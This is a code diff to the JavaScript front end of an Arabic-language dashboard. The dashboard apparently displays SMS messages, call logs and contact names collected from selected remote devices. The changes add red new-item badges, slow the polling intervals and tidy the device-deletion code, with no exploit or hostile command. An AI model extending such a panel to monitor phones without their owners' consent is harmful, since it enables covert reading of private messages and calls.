@@ -42,30 +42,43 @@ function showNotification(title, message, icon) {
     setTimeout(() => { if (div.parentElement) div.remove(); }, 5000);
 }
 
-function checkNewCalls(newCalls) {
-    if (!newCalls || newCalls.length === 0) return;
-    if (lastCallCount > 0 && newCalls.length > lastCallCount) {
-        const c = newCalls[0];
-        showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
-    }
-    lastCallCount = newCalls.length;
-}
-
+// ✅ فحص رسالة جديدة + علامة
 function checkNewSMS(newSMS) {
     if (!newSMS || newSMS.length === 0) return;
     if (lastSmsCount > 0 && newSMS.length > lastSmsCount) {
         const s = newSMS[0];
         showNotification('💬 رسالة جديدة', `${findContactName(s.address) || s.address}: ${s.body || ''}`, '💬');
+        
+        // ✅ علامة حمراء
+        const badge = document.getElementById('smsCount');
+        if (badge) {
+            badge.textContent = `(${newSMS.length}) 🔴`;
+            badge.className = 'count badge-new';
+        }
     }
     lastSmsCount = newSMS.length;
 }
 
-// ✅ زر حذف الجهاز — يعمل
-async function deleteDevice() {
-    if (!currentDevice) {
-        alert('⚠️ اختر جهازًا أولًا');
-        return;
+// ✅ فحص مكالمة جديدة + علامة
+function checkNewCalls(newCalls) {
+    if (!newCalls || newCalls.length === 0) return;
+    if (lastCallCount > 0 && newCalls.length > lastCallCount) {
+        const c = newCalls[0];
+        showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
+        
+        // ✅ علامة حمراء
+        const badge = document.getElementById('callCount');
+        if (badge) {
+            badge.textContent = `(${newCalls.length}) 🔴`;
+            badge.className = 'count badge-new';
+        }
     }
+    lastCallCount = newCalls.length;
+}
+
+// ✅ زر حذف الجهاز
+async function deleteDevice() {
+    if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
     if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
     
     try {
@@ -82,9 +95,7 @@ async function deleteDevice() {
         } else {
             alert('❌ خطأ: ' + (result.error || 'غير معروف'));
         }
-    } catch (e) {
-        alert('❌ خطأ في الاتصال: ' + e.message);
-    }
+    } catch (e) { alert('❌ خطأ في الاتصال: ' + e.message); }
 }
 
 async function loadDevices() {
@@ -103,12 +114,8 @@ async function loadDevices() {
             select.appendChild(option);
         });
         
-        if (currentValue) {
-            select.value = currentValue;
-        } else if (devices.length > 0) {
-            selectDevice(devices[0].id);
-            select.value = devices[0].id;
-        }
+        if (currentValue) { select.value = currentValue; }
+        else if (devices.length > 0) { selectDevice(devices[0].id); select.value = devices[0].id; }
     } catch (e) {}
 }
 
@@ -137,8 +144,8 @@ function selectDevice(deviceId) {
     if (dataInterval) clearInterval(dataInterval);
     
     if (deviceId) {
-        updateInterval = setInterval(updateLiveData, 3000);
-        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 5000);
+        updateInterval = setInterval(updateLiveData, 5000);
+        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
         updateLiveData();
         loadAllData();
     }
